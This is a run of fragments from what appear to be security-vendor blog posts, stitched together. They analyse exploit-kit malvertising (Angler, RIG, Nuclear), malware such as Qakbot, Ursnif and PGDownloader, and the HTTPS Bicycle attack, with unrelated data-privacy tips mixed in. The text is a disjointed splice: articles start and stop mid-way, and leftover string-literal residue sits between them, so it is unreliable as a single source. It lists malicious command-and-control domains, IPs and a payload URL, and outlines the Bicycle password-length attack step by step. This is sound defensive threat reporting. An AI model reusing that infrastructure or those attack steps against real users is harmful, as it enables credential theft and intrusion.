We blogged about this new exploit on January 27. The Flash Player exploit we analyzed in this particular attack on January 29 is available on VirusTotal.\n\n\n	The payload that this variant of Angler EK distributed was a malware known as Bedep, which was loaded in memory rather than being written to disk. Bedep generates its domains with a domain generation algorithm (DGA) - below are some of the most recent domains it has been using:\n\n\ncrtmzljcejozgp[.]com\nkfkyfbjsxnsicve50[.]com\nizganktshlyxryjn87[.]com\nltntvidynijnjnvv9e[.]com\nbjatnppvspr9q[.]com\ndebeypjqcbdoy[.]com\nterhunucaqhnmdzbie[.]com\n\n\n	Bedep\'s usual motive is click-fraud by generating illegitimate traffic to arbitrary web sites in order to generate financial revenue for the criminal operator behind it. However, it is also capable of downloading and executing additional malware. In this case we saw Bedep downloading a variant of the Vawtrak banking trojan. The Vawtrak sample we analyzed is available on VirusTotal.\n\n\n	Indicators Of Compromise\n\n\n	The following indicators of compromise are by no means an exhaustive list.\n\n\n	Malicious Redirects\n\n\nfersi[.]tk\ndemo.choxedanang[.]com\n\n\n\n	Angler Exploit Kit\n\n\naimhy.rao1hu038z2[.]space\nsup.emmiemiller[.]org\n\n\n\n	Bedep Command-and-Control\n\n\ncrtmzljcejozgp[.]com\nkfkyfbjsxnsicve50[.]com\nizganktshlyxryjn87[.]com\nltntvidynijnjnvv9e[.]com\nbjatnppvspr9q[.]com\ndebeypjqcbdoy[.]com\nterhunucaqhnmdzbie[.]com\n\n\n\n	Vawtrak Command-and-Control\n\n\natlasbeta[.]com\ndadry[.]com\n93.170.104[.]20\n91.200.14[.]110\n46.161.1[.]105\n5.187.2[.]19\n\n\n\n	Protection Statement\n\n\n	Forcepoint Special Investigations notified:\n\n\n		YATRA via email of the incident shortly after confirming the compromise.\n	\n		Popular search engines of the compromise once YATRA had acknowledged receipt of the notification and\n	\n		Badware clearing houses such as https://www.stopbadware.org/\n\n	Forecepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - The injected Flash object on the compromised website is detected and blocked.\n	\n		Stage 3 (Redirect) - The malicious redirect to Angler EK is blocked in real-time.\n	\n		Stage 4 (Exploit Kit) - The Angler EK pages are identified and prevented from exploiting the user\'s browser.\n	\n		Stage 6 (Backchannel Traffic) - Attempts by both Bedep and Vawtrak to contact their command-and-control servers are detected and blocked.\n\n	Observations\n\n\n	This is yet another example of a site that is serving up malware because an associated site has been compromised. For those hosting and running large sites such as this, it is imperative that the integrity of the whole service is managed consistently and not just focused on the \'front door\' site. Equally, it is absolutely crucial to keep up with the basics: ensuring that default credentials are removed and that software is kept updated and patched at all times. More broadly, having a process to handle these incidents when they happen, and they will, is critical to running large web sites such as this. Exercising these response processes before a real incident. Just like the fire-drills we are all now used to, this is a great way to identify systemic flaws before they are identified during the heat of a real incident.\n\n\n	Most important of all is that time is of the essence: high profile sites such as this one that have millions of visitors are magnets for the criminals.  In this particular case, the criminals know they have the opportunity to compromise over quarter of a million visitors every day that the malware is still being served up by the site.\n\n\n	Summary\n\n\n	Criminals are continuing their efforts to maximize the potential number of victims.  They are compromising scripts on hosts that are used by highly popular sites, without having to compromise the target site itself. These criminals are able to turn this traffic into financial revenue by installing click-fraud malware onto a victims\' machines in order to generate traffic to URLs of their choosing. Alternatively, they may drop crypto ransomware or other dangerous malware onto the target machine as we have also seen recently.', 'https://www.forcepoint.com/blog/security-labs/top-20-airline-travel-site-yatracom-victim-malvertizing-attack-redirects-users\n');

In the age of the data breach, with cyber security intrusions seeming to take place on a near weekly basis, it seems hardly necessary to designate a day to emphasize the importance of protecting data and data privacy.  And while most companies recognize that cyber security technology is an indispensable tool in preventing breaches, data policies, employee training and other business controls are necessary for it to be most effective.\n\n\n	Basics for Businesses\n\n\n	In addition to implementing technological solutions, a few simple considerations can help keep data breaches at bay.\n\n\n	- Know Where Your Data is and What’s Important\n\n\n	Not all data is created equal. It’s critical to determine WHAT and WHERE your data is before deciding how best to protect it. Decide what data is most valuable to the business – for some that could patient records, for other intellectual property – classifying it from most to least important, THEN make determinations as to where that data should be kept on the network, who should have access to it, and how.\n\n\n	- Put Role Based Access Controls in Place \n\n\n	Not everyone needs access to all pieces of information. Your human resources department has a legitimate business need to attain certain employee data, like salary and evaluation reports, but it’s unlikely the purchasing department should need equal access to such records. Limit access to specific data only to those who require it to perform their required job role.\n\n\n	- Implement Data Handling Processes and Educate Your Employees on What They are\n\n\n	Put polices on the handling of data in place and communicate it to employees. This includes instructing them on how data should be stored and shared based on its classification (using password protection or encryption, for instance) and making sure they have the technology and training to comply with the required rules and guidelines.\n\n\n	 \n\n\n	Counsel for Costumers and Consumers \n\n\n	We expect organizations that store our data – like payment information, banking details, purchasing choices and personal specifics – to do so responsibly and to keep that data secure. But being cognizant of our own user behavior in relation to that data can go a long way to keeping us even more secure.\n\n\n	For instance: Always confirm the name and IP address before logging on, and unless you’re certain of the source don’t click on links in email. When typing in web addresses in email, look for HTTPS (at the start of the web address) and SSL (Secure Sockets Layer) which ensures data passed between devices and web servers is encrypted. Your best option: using a Virtual Private Network (VPN) which simulates a private network even when using on a public one.\n\n\n	Bottom line: whether running a business or acting as a consumer of one, a few common sense practices can make the difference between data being protected or exposed.

Injected code on compromised website\n\n\n	The code injected into the website in this instance was a very large piece of obfuscated code, a snippet of which can be seen in fig 1. The intention of the code was to redirect users to an exploit kit known as Angler EK, and we see this type of code injected into hundreds of websites on a daily basis. The actors behind the code sometimes redirect users to Neutrino EK for a few days as they did at the beginning of January, but they almost always lead to Angler.\n\n\n	\n\n\n	fig 2.

Many of us would of course use Google search to find these dates. But browsers beware, because one of the top results may result having your credentials and monies stolen by malware. The website in question: officeholidays[.]com, has been compromised and leads users to RIG exploit kit (EK).\n\n\n	Compromised Website\n\n\n	If you were to search for the term \"public holidays\" on Google UK then the website officeholidays[.]com would currently appear to you in the top three results. This site currently has an estimated 1 million visitors per month according to SimilarWeb.\n\n\n	\n\n\n	However, this site has been compromised and visitors are being silently redirected to malicious content that will drop malware onto their machines. During our analysis we saw the following malicious traffic occurring:\n\n\n	\n\n\n	Hand Crafted Javascript\n\n\n	What caught our attention and we believe is noteworthy is that a Javascript named slider.js has been included into officeholidays[.]com. This Javascript file does not seem to be a legitimate one that is used by the site. It has been included in such a way that it looks completely legitimate. This does not seem indicative of an automatic process that injects code into compromised websites. This is the behavior which we normally see. Instead, it seems likely to have been hand crafted and by someone who has taken the time to understand the code formatting and resource inclusions of the website.\n\n\n	Ultimately, we were silently redirected to an exploit kit called RIG. This attempts to find and exploit vulnerabilities on our system in order to execute malware.\n\n\n	 \n\n\n	RIG Exploit Kit & Qakbot Payload\n\n\n	RIG EK was able to successfully exploit a vulnerability (CVE-2015-5122) in our Adobe Flash Player version 19.0.0.207. Interestingly though, we found that RIG EK would not successfully exploit some newer Flash Player versions such as 19.0.0.245, despite other exploit kits such as Angler being able to do so.\n\n\n	After successful exploitation a malware payload was downloaded from the RIG EK server. RIG is known to use a simple XOR on the payload and in this instance the XOR key was \"vwMKCwwA\".\n\n\n	\n\n\n	The resulting malware was Qakbot (SHA1:8f01932de5c565fa6d559998cc1938ac5f23c264), which is a multi-capable credential theft trojan that steals passwords, certificates, cookies, browser traffic and anything it can get its hands on. It  has plenty of anti-VM capabilities as an attempt to prevent auto-analysis tools from executing the malicious code, as well as being able to spread to network shares and removable drives.\n\n\n	Qakbot will capture browser traffic to and from banking websites if they match on pre-defined URL patterns, such as those in the following snippet that we extracted during our analysis:\n\n\ntdetreasury.tdbank.com\ncmoltp.bbt.com\ncashmanageronline.bbt.com\n.hsbcnet.com\nebc_ebc\nblilk.com\nbankeft.com\ncmol.bbt.com\nsecurentrycorp.zionsbank.com\ntmcb.zionsbank.com\n.web-access.com\nnj00-wcm\ncommercial.bnc.ca\n/clkccm/\npaylinks.cunet.org\ne-facts.org\naccessonline.abnamro.com\n...\n\n\n	Qakbot communicates with its command-and-control (C&C) infrastructure over HTTP(S) and uploads stolen data over FTP.

The mere act of browsing to this website could result in significant financial and personal loss.

Recently however, we noticed a Kovter e-mail campaign that was attempting to download proxy software onto users\' machines via a JavaScript downloader. Whilst not malicious by itself, the proxy software (ProxyGate) is silently installed by the malware and automatically registered on the ProxyGate network. This means that the user\'s machine can be used for subsequent network traffic by anybody using ProxyGate, essentially making the machine a zombie for anybody\'s use. At the time of writing this blog, the actors were no longer using malware to download ProxyGate and have reverted to their usual distribution of the Kovter and Miuref malware families.\n\n\n	E-mail Lure\n\n\n	The e-mail lures we are seeing for this campaign have a consistent fax-related theme:\n\n\n	\n\n\n	fig 1. E-mail lure\n\n\n	These e-mails usually contain a ZIP file attachment with a malicious JavaScript (JS) file inside, but there are also some e-mails which contain a clickable link such as in fig 1. Interestingly, these links abuse an open redirect on a well known Alexa top 10 site which takes the user to the attacker controlled website, and tries to download a ZIP containing a malicious JS downloader.\n\n\n	UPDATE: (January 25, 2016) We are now able to disclose that the open redirect is located on a Google sub-domain. We are working with Google who are currently addressing the issue.\n\n\n	\n\n\n	fig 2. ZIP file containing malicious JS file.\n\n\n	Forcepoint has notified the \'Alexa top 10 site\' regarding the open redirect abuse.\n\n\n	JS Downloader\n\n\n	The malicious JS file inside the ZIP files for this campaign are obfuscated malware downloaders. When the script is deobfuscated it is clear that the intention is to download and run 3 executables:\n\n\n	\n\n\n	fig 3. Deobfuscated malicious JS downloader\n\n\n	Typically, we see the Kovter and Miuref malware families downloaded by these scripts, but in this instance once of the executables that we saw was a new, albeit primitive malware, that we are naming \"PGDownloader\".\n\n\n	PGDownloader & ProxyGate Installation\n\n\n	When PGDownloader is executed it will begin logging events to its command-and-control (C&C) server, while downloading and silently installing the ProxyGate software in order to turn our machine into a zombie. This is not a new concept from malware actors, and we have blogged on the topic in the past in relation to the Bunitu malware.\n\n\n	Here is the full log that it sent to its C&C when we analyzed the malware:\n\n\nStartDownloadThread\ni am in DownloadThread\nThread Download Complete!\nDownloadThread done!check file...\nCreateNewDesktop\nCreateProcessInNewDesktop\nStart Install Thread\nSetThreadDesktop\n[PageIndex:0] Click NextButton\n[PageIndex:1] Click \'accept the agreement\'\n[PageIndex:1] Click NextButton\n[PageIndex:2] Click NextButton\n[PageIndex:3] Click \'Don\'t create a Start Menu folder\'\n[PageIndex:3] Click NextButton\n[PageIndex:4] Click NextButton\n[PageIndex:5] Click InstallButton\n[PageIndex:7] Click FinishButton\n[PageIndex:7] Done!\nInitialize\nRun cloud...\nSendReport\neverything is done!delete me now..\n\n\n	Each log event is a unique HTTP request to the C&C server with a user-agent of \"reportlog\" or \"f[redacted]ing\", making this quite a noisy piece of malware:\n\n\n	\n\n\n	fig 4. PGDownloader network traffic\n\n\n	As shown in fig 4, PGDownloader downloads an executable named pgppi.exe which is the ProxyGate software that will be installed. This is actually a graphical installer wizard:\n\n\n	\n\n\n	fig 5. ProxyGate setup wizard\n\n\n	However, PGDownloader silently installs the software by creating a new and invisible desktop with the CreateDesktop Windows API, and then finds and clicks the buttons on the wizard automatically.\n\n\n	After installation PGDownloader launches the Cloud.exe component of ProxyGate which will automatically register the machine as part of the ProxyGate network. This means that any users of ProxyGate can now use our machine in order to browse the Internet, which of course includes the ability to conduct illegal activity.\n\n\n	At the time of this blog there are over 7,000 IP addresses available to use on the ProxyGate network, although it is unknown how many of these were registered on the network as a result of PGDownloader.\n\n\n	Customer Protection\n\n\n	Forecepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n	\n		Stage 5 (Dropper) - The malware is prevented from being downloaded from the malicious URLs.\n	\n		Stage 6 (Backchannel Traffic) - Attempts by the malware to contact its command-and-control server are detected and blocked.\n\n	Summary\n\n\n	Malware actors are always seeking new opportunities and new malware that can improve their success rates. PGDownloader provides an easy way for these actors to expand their infrastructure in order to use more machines for malicious purposes, and in turn hide the attackers\' identities behind other machines.

Actual image hosted on command-and-control server\n\n \n\nExecutive summary\n\nThere are several interesting aspects to this threat as summarized below:\n\nThe malware is downloaded from a JPG file but where a normal user would see an image when browsing to the site, the malicious document pulls down an octet-stream.\n	The malware payload is a credential stealer known as Ursnif and is signed with a valid certificate.\n	The Ursnif malware uses HTTPS for its communication.\n	The e-mail campaign containing the malicious DOC file was targeted towards Australian users. \n \n\nProtection statement\n\nOur customers are protected against this campaign via Advanced Classification Engine (ACE), at multiple stages of attack:\n\nStage 2 (Lure) - ACE identifies and blocks the malicious e-mail.\n	Stage 5 (Dropper) - ACE identifies and prevents the malicious payload from being downloaded to the target machine.\n	Stage 6 (Call Home) - ACE identifies and prevents the command-and-control (C&C) traffic.\n \n\nE-mail lure\n\nThe e-mail lures used in this attack had a consistent tax payment theme:\n\n\n\nThe content of the DOC file attachment is a typical attempt to trick a user into enabling macros:\n\n\n\nMalicious DOC macro\n\nOnce the malicious DOC has been opened in Microsoft Word and a user has enabled macros, a malicious macro will execute in the background and attempt to download and execute malware. However, this is done in a unique way to what we have typically seen in the past, and we have been seeing this new technique since the end of December which has normally been used to distribute the Dridex malware family. Didier Stevens wrote an analysis of the same technique recently on his blog.\n\nFirstly, the macro will decrypt a secondary embedded and obfuscated Visual Basic Script (VBS) and write it to disk. This VBS is then executed and will send an HTTP request to a malicious site hosting a JPG but will only download part of the content by using the \"Range\" HTTP header. The \"Range\" header works by allowing the HTTP client to request the range of bytes that they want to download from the target URL\'s content, instead of receiving the entire content.\n\nIn this particular instance, we saw a malicious DOC file using a macro to download part of a JPG file. Here is how the request and response looks like from the malicious DOC\'s point of view:\n\n\n\nAnd here is how the request and response looks like for a normal browser:\n\n\n\nAs shown, when the malicious DOC file downloads the JPG it only requests byte 49507 onwards and this is where the encoded malware is located within the JPG file. When a browser requests the JPG it will naturally request the entire content, and so the entire legitimate JPG file will be downloaded and shown to the browsing user. The encoded malware appended to the end of the file is invisible to a browsing user who will only see a benign image of a kangaroo. \n\n The image below shows the encoded malware appended to the JPG at byte 49507 onwards:\n\n\n\nThis technique makes it more difficult for analysis tools to detect the existence of the malware, and also makes the JPG seem benign to somebody who browses to it. This method is not something that we would strictly class as a form of steganography, as the malware is only crudely appended to the end of the JPG.\n\n \n\nUrsnif malware payload\n\nThe Ursnif credential stealer was the payload in this particular attack This malware is known for its ability to steal passwords and other credentials from a system, as well as hooking into browsers in order to change and intercept the content on banking websites in order to capture a user\'s banking credentials and personal information.\n\nThe sample we analysed was aa6a79a66b66c9b48f4cf00574a5368eaa2af99f and relied upon the following C&Cs over HTTPS:\n\nclinothingjclientallow.me (46.105.208.22)\n\nnothingjclientallow.me\n\naswallowclijscagent.me\n\nallowjuserjofficer.me\n\nallowdisallowjscoffuser.me\n\njclientjclient.me\n\nclientalallow.me\n\nnothingallowalallow.me\n\nallowagentdisallow.me\n\ncliofficerjscallow.me\n\nclibarbradyjscallowcli.me\n\nIt also obtained a payload from the following location:\n\nhxxp://212.47.195.235/10007u\n\n \n\nSummary\n\nMalware actors are always looking for new ways to fool an unsuspecting victim into running their malicious code, as well as new ways to bypass analysis tools and trick researchers and investigators. Financially motivated crime remains popular among these sorts of actors, who will use any means necessary to obtain various user credentials and banking information without much care as to who they infect. It is important to be aware of suspicious e-mails that you receive and to never open anything that you are unsure about.\n\n \n\nUPDATE (01/11/2016)\n\nWe decided to do a bit more analysis on the VBS file that downloads the partial JPG with the malware payload. The VBS is obfuscated and difficult to understand in its raw format:\n\n\n\nHowever, when we de-obfuscated the macro we noticed what seems to be an error in their XOR based encoding/decoding algorithm:\n\n\n\nThe author of this code has used the rounded division operator \'\\\' where he or she probably meant to use the modulo operator \'Mod\'. As a result, only the first character \'R\' of the encoding key \"RopeCut6\" is ever used rather than the full key. This means that the encoding scheme is a lot weaker and very obvious to any analysts who look at the payload. In addition, automated analysis tools will often look for single byte xor-encodings and automatically decode them. Ultimately the end result is that the malware author\'s payload may be discovered and detected a lot quicker than it would have otherwise been if they had used the full, intended encoding key.\n\nInterestingly, the way they encode the payload must have the same error because the payload decodes and executes without any problems. However, even if the malware author was to change or fix this algorithm then Raytheon|Websense products would still protect against this threat because we do not rely on the payload encoding.\n\nEncoding and encryption mistakes are commonplace among cybercriminals who do not typically have the kind of code quality reviews that a professional, commercial organisation would have.', 'https://www.forcepoint.com/blog/security-labs/range-technique-permits-ursnif-jump-your-machine\n');

The attack, known as the HTTPS Bicycle Attack, is able to determine the length of specific parts of the plain-text data underneath captured TLS packets using a side-channel attack with already known information. The attack has a few prerequisites but could be applied in a real world scenario, and is completely undetectable due to its passive nature.\n\n                                        \n\nExecutive Summary\n\nThe HTTPS Bicycle attack can result in the length of personal and secret data being exposed from a packet capture of a user\'s HTTPS traffic. For example, the length of passwords and other data (such as GPS co-ordinates) can be determined simply by analysing the lengths of the encrypted traffic.\n\nSome of the key observations of this attack are as below:\n\nRequires a packet capture containing HTTPS (TLS) traffic from a browser to a website\n	The TLS traffic must use a stream-based cipher\n	Can reveal the lengths of unknown data as long as the length of the rest of the data is known - this includes passwords, GPS data and IP addresses\n	Packet captures from several years ago could be vulnerable to this attack, with no mitigation possible\n	The real world impact is unknown, as there are several prerequisites that may be hard to fulfill.\nThis leads us into interesting discussions on the resilience of passwords as a form of authentication method. First we will explain how the attack works.\n\nHow Does the Attack Work?\n\nThe Bicycle attack, in the context of obtaining the length of a user\'s password from a browser request, is fairly simple. All a user needs to do is have a packet capture of requests to a known site, including an authentication (login) request containing an already known username and an unknown plain-text password. If an attacker can determine the user\'s browser and how that browser would send requests to the site, they can subtract the length of all the known data the browser would send except for the piece of information they are interested in, which will result in them knowing the length of the unknown data.\n\nThis particular attack scenario can be summarised from the point of view of an attacker:\n\nObtain a packet capture (i.e. via a Man-in-the-Middle attack) which has stream-cipher TLS traffic of encrypted browser requests to a known website, including one where there was likely to be a password sent in an authentication request. The target site may be revealed in the packet capture in the form of a DNS request, or the attacker may be able to find this out with some reconnaissance.\n	Obtain a \"User-Agent\" string from the packet capture or determine which browser the target was using.\n	Replicate browser requests to the site using the same browser as determined in (2). This will reveal the lengths of the requests to various pages on the site.\n	From the encrypted TLS payloads of the browser requests in the packet capture, extract the lengths of the payloads.\n	Compare the Pearson correlation coefficient for the plain-text and encrypted requests. This will enable us to compare plain-text and encrypted request lengths in order to reveal which encrypted TLS requests are for which pages (URLs) of the website.\n	From (5) you should now know which TLS encrypted request is for the login page of the website. You can then subtract the length of the known headers that the browser would send to this page, including any possible cookies that are static enough in length to be determined. Also subtract the length of the posted or queried data containing the user\'s username that we already know, and anything else that is possible to pre-determine in the request.\n	The length you end up with should be the length of the user\'s password\nCracking Passwords\n\nIf we successfully reproduce the Bicycle attack and obtain the length of a user\'s password, we must still try to crack the password and this can only be done by sending login requests to the target website unless we can leverage a known plain-text attack vulnerability on the stream-cipher. If we know that the password length is 8 characters and only contains letters and no numbers or symbols, we have a dictionary containing 200,000 possible 8 character passwords in which our target password exists, and we are able to send 10 login requests to the target website every second, then the password should be revealed within 5.5 hours. This could be further improved by checking for more common passwords first. However, this kind of approach requires that the website we are sending the login attempts to has no threshold or prevention on failed login attempts.\n\nIt would not be feasible to do a true brute forcing of the password by sending login attempts to the target website, so our password should be good enough to avoid typical dictionary attacks. A strong password of at least 8 characters which contains numbers and symbols should make cracking a lot more difficult.\n\nHow Can the Attack be Mitigated?\n\nThis attack cannot be mitigated for packet captures that already exist and are vulnerable as per the requirements mentioned. However, a strong password as previously suggested will ensure that cracking it is somewhat unfeasible. Two-factor authentication for websites will also prevent access to your account, even if your password is compromised.\n\nIt is also recommended that web platform developers and website operators ensure that they do not allow their web applications to expose browsing users to this vulnerability.\n\nIn order to prevent this attack in any future scenarios, the following criteria should be met by website operators:\n\nTurn off support for TLS stream-ciphers.\n	Ensure that you are supporting the newest version of TLS, currently version 1.2.\nAnd the following criteria should be met by web platform developers:\n\nFor any secret information (such as passwords, GPS co-ordinates, unique IDs etc.) being sent in browser requests, ensure that they are padded or hashed to a fixed length.\nSummary\n\nOn the surface, and despite the requirements for a successful attack, the HTTPS Bicycle attack is a real and dangerous threat that could potentially result in a new wave of personal and secret information being divulged in the near future. It is yet to be determined how wide scale this issue could be and how feasible the attack is in a real world scenario, but the lack of retrospective mitigation poses a big risk to users. In this case the burden of mitigation falls on the shoulders of the user who should ensure his or her password is sufficiently strong, and also the website operators and web platform developers who should ensure that they are fully up to date and are taking steps to prevent this attack from occurring in the future.\n\nYou can keep up to date with the discussion of HTTPS Bicycle on Reddit at https://www.reddit.com/r/netsec/comments/3zc5qu/https_bicycle_attack/\n\nReferences\n\nGuido Vranken (2015), \"HTTPS Bicycle Attack\", https://guidovranken.files.wordpress.com/2015/12/https-bicycle-attack.pdf', 'https://www.forcepoint.com/blog/security-labs/https-bicycle-attack-obtaining-passwords-tls-encrypted-browser-requests\n');

It’s also often when old technology is jettisoned in favor of the newest mobile phones, printers, or laptops. But before you throw old technology on the trash heap be sure you’re not also leaving valuable data behind. Deleting files doesn’t necessarily mean they’re gone for good.\n\n\n	Though different in form and function, printers, PCs, laptops, and smartphones have one thing in common: hard drives. When a file is deleted from a hard drive, the file doesn’t disappear, only the marker used to find it. Much like removing a headstone without moving the grave beneath it, the body is nonetheless still there even if the landmark is not. This means that anyone with time and the skills to dig through a hard drive can still unearth deleted data.  An October 2015 study found 48 percent of hard disk and solid state drives and 35 percent of mobile devices contained residual data where deletion attempts had been made. However there are ways to ensure the data you delete is permanently removed, privacy protected and regulatory standards satisfied.\n\n\n	PCs & Laptops\n\n\n	PCs and laptops contain one of two drives: a mechanical hard drive – a magnetic coated, rotating disk driven by a motor - or an internal solid-state drive (SSD), a stationary flash drive that doesn’t require movement for functionality.  Data is written and saved on these drives -  and recognized as text, numbers, images, etc. - as a unique series of binary digits combined of 1’s and 0’s. Overwriting that data with 0’s via a low level format (LLF) – known as zero-filling or zeroing - wipes out that data permanently.  There exist several free LLF tools to zero-fill a data storage device, many of which can be found on sites such as HDD Guru or KillDisk.\n\n\n	Mobile phones\n\n\n	Many people assume that removing the SIM card in their phone effectively erases the data on it. But removing the SIM card only stops the phone from communicating with the network, it doesn’t erase the data on the phone. Performing a factory reset on the device and then overwriting that data via LLF ensures your email contact lists, phone numbers, texts and pictures aren’t also inadvertently passed along to the next owner. Keep in mind a record of various call durations may remain visible even after a factory reset and LLF; this is to prevent a used handset from being sold as new.\n\n\n	Printers\n\n\n	Personal printers – those for at home use – in general do not contain hard drives and therefore any memory for retaining print jobs. However, larger commercial printers do contain hard disk drives to both manage multiple workloads and speed up production. This means recent print jobs, scans, copies, and faxes may remain on the internal drive after use. Occasionally, these drives are easily removed and connected to a PC where remaining data can be erased via LLF. In other cases, contacting the manufacturer to determine how best to remove any remaining data is your best bet.\n\n\n	And if all else fails there is one other option: physically destroying the drive itself with an industrial shredder or hammer.', 'https://www.forcepoint.com/blog/insights/dispose-don%E2%80%99t-expose\n');

Factors in determining this include: browser User-Agent, IP address and referring website.

In our case, the only vulnerability that was exploitable on our system was in our intentionally outdated Adobe Flash Player version 19.0.0.245. This vulnerability (CVE-2015-8446) is the newest Flash Player exploit in the wild, which was recently reported by Kafeine on his blog.\n\n\n	Once the Flash Player exploit successfully gained a foothold on our system, it downloaded the CryptoWall 4.0 ransomware from the Angler EK server. This ransomware is newer version of the CryptoWall malware (previously version 3.0), which now randomises filenames as well as encrypting most of the documents found on a machine. After our files were encrypted, we were then requested to pay 500 USD to get the files back.\n\n\n	 \n\n\n	Of course, we didn\'t pay the ransom because we were running the malware on a virtual machine with no important files on and besides, we have spent all of our money on Christmas presents already. \n\n\n	 \n\n\n	Summary\n\n\n	Attackers are becoming increasingly intelligent, choosing to compromise websites that they know will be popular during holidays and special occasions. Without adequate protection or updates to your software, you remain particularly vulnerable to these sorts of attacks which will occur in the background and do not require any user interaction.  Remember: software updates are for life and not just for Christmas, so make sure you are always up to date!\n\n\n	Happy Holidays!', 'https://www.forcepoint.com/blog/security-labs/early-christmas-present-exploits-cve-2015-8446-and-drops-cryptowall-40\n');

Through analysis of the memory footprint, we can gain insight that might not be otherwise available. \n	\n		In the memory analysis of a sample case study, we are able to observe the following malicious activity:\n		\n				Deleted executable files with an uncommon name\n			\n				Spoofed command line execution\n			\n				Command history logging disabled\n		\n	\n		The use of memory analysis can reduce dwell time and help mitigate the risk\n\n	The Problem of Malware Analysis Today\n\n\n	Malware is becoming increasingly smarter; employing environment validation and polymorphism as a way to evade security products. This translates to an overwhelming numbe -hundreds of thousands-of samples generated everyday by malware authors. Reverse engineering samples at this scale is an uphill task for a security vendor. \n\n\n	With that in mind, analysis of the memory footprint can provide a unique perspective into malicious events and bring down the number of samples to be evaluated as this tends to change less frequently in highly polymorphic campaigns as well. Despite the evasion techniques employed, the end goal and thereby actions taken will typically leave a trace in memory. Using SureView Memory Integrity , we are able to look at changes that happen in memory and identify events that compromise the integrity of processes in addition to performing memory based forensics. This helps reduce dwell time by enabling administrators to take action when a Linux server is compromised. They are able to detect stealthy malware and get alerted on unknown or unexpected modifications to systems without the need to constantly update the product with signatures. \n\n\n	More Than Meets the Eye\n\n\n	In this run, we ran variants of the currently active and highly polymorphic Linux/Xor.DDOS Trojan variant. The naming by the research community is based on the use of XOR encryption within its code and in its CnC traffic. The ability to compile its source code to target various systems in combination with XOR encryption gives it a polymorphic quality which makes it rather difficult to recognize with traditional detection methods. Additionally, it employs varied usage of DNS server lookups and ports. Let\'s explore some of the first indicators of a server’s compromise via analysis of the server memory.\n\n\n	\n\n\n	One of the first warnings that arises is that executable files have been unlinked (deleted) from the file system. By removing executed files, malware authors attempt to cover their tracks. It\'s interesting that, one of the executable files has an uncommon name /usr/bin/kzeqlxgdeg thereby adding to the suspicion. At this time, we can observe that the alerted files were executed and unlinked. Let’s see what additional context we can derive.\n\n\n	Looking at the entire process tree we get a view into the executed commands associated with the unlinked files. In this case, we are observing a set of commands that reveals system details:\n\n\n	\n\n\n		Reveals the active user account (PID 3866)\n	\n		Current DNS servers  being utilized (PID 3875)\n	\n		Provides a glimpse of the networking environment that the infected machine is in (PID 3876)\n	\n		Lists users currently logged in (PID 3880)\n	\n		Enumerates running processes, providing lists of exploitable applications (PID 3890)\n	\n		Enumerates files on system (PID 3891)\n\n	As you can observe, one of the executable files appears to use the “cat resolv.conf” command, which would reveal routines that provide access to the Internet Domain Name System (DNS). We can then take this a step further and trace the observed discrepancies by PID.\n\n\n	\n\n\n	What appeared to be a suspicious command associated with reconnaissance tactics reveals itself to be something more nefarious. A discrepancy is found between the logged terminal command and the actual command executed (Fig. A). While the full command line entry, which we also observed via PID logs, reads “cat resolv.conf” this is actually a spoofed command tgat was logged (as seen in the process tree). As we can observe in the command field the executed item was in fact “kzeqlxgdeg”. We are able to observe the actually executed command despite attempts to spoof a less suspicious one. When looking at the environment at the time of execution we observe the actual intent (Fig. B).  In this case, environment variables have been set to prevent further command history from being logged. \n\n\n	If end users have specific evidence, they are able to address the matter at hand as well as discover the methodologies that were employed. This provides a basis for strengthening the overall ecosystem based on observed or attempted malicious attacks on even a single machine. This is due to monitoring of memory over time that allows the analyst to identify changes which deviate from the norm.  \n\n\n	This malware variant employed a variety of techniques to evade detection by administrators and security researchers. We have been able to leverage indicators that allowed us to identify anomalies that have occurred on our system that would otherwise be difficult to trace – especially after some of those initial changes made by the malware. While traditional forensic analysis techniques might look for indicators which are dynamic in nature, analysis at the memory level gives us a view into server activity not otherwise available. This provides the analyst a starting point for investigation and quick remediation.\n\n\n	Results from above can be used in addition to the context and other triggers on the system to arrive at the total risk to the system from the specific incident. In this case, the suspicious events above can be combined with other network behavior of the Linux/Xor.DDOS Trojan such as reaching out to its CnC server to get a list of targets, downloading arbitrary binaries, DDoS activity behavior. This risk based approach helps prioritize incidents that need to be further investigated to reduce dwell time and mitigate risk. \n\n\n	Contributors: Jose Barajas with input from Andrew Tappert, Tom O’Connor and Rajiv Motwani', 'https://www.forcepoint.com/blog/security-labs/polymorphism-less-different-you-might-think\n');

This means that the exploit is likely to be the newest Flash exploit, leveraging CVE-2015-7645, which was recently known to have been incorporated into the Nuclear and Angler exploit kits. In fact, the Nuclear Exploit Kit seems to be packaging up two different Flash Player exploits inside one parent SWF file (<a href=\"https://www.virustotal.com/en/file/5988cc77852e0d9e56c407ecd60b753a62990... target=\"_blank\">VirusTotal</a>), and dynamically choosing which one to load, depending on the current Flash Player version. If it detects version 18.0.0.203 or below,&nbsp;an exploit leveraging CVE-2015-5122 is&nbsp;used. Otherwise, the new exploit is&nbsp;chosen:</p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/1638.blewmymind_nuclear_swfexp.png-550x0.png\" style=\"height:343px; width:494px\" /></p>\n<p>We successfully managed to unpack the new SWF exploit, and found that it had been on&nbsp;<a href=\"https://www.virustotal.com/en/file/e111ae9229d4538577afebd25c10ab9355158... target=\"_blank\">VirusTotal</a>&nbsp;since 31 October.</p>\n<h2>Malware Payloads</h2>\n<p>It&#39;s not typical to see more than one payload dropped by an exploit kit, but in this instance both Gamarue and CryptoWall 3.0 were dropped and executed&nbsp;via the Flash Player exploit.</p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/1715.blewmymind_capture.png\" style=\"height:559px; width:1200px\" /></p>\n<p>Gamarue is&nbsp;modular, plug-in based malware belonging to the Andromeda botnet.

However, because businesses in financial services must maintain a real-time connection to the global economy to function properly, an attack that impacts this ability has the potential to cripple economies, impacting stock markets, businesses, and consumers alike.  Ironically, the very security precautions –patching servers with known vulnerabilities, for instance -  that might protect banks and other organizations can also disrupt vital communications between these entities if those in the chain have not also upgraded their systems.\n\nHow severe and complex are the cybersecurity attacks targeting financial services? In its report analyzing the volumes and attack techniques from January through May 2015, Raytheon|Websense found that financial services encounters security incidents 300 percent more frequently than other industries and are targeted by 33 percent of all lure stage attacks.\n\nBut that’s only the beginning.

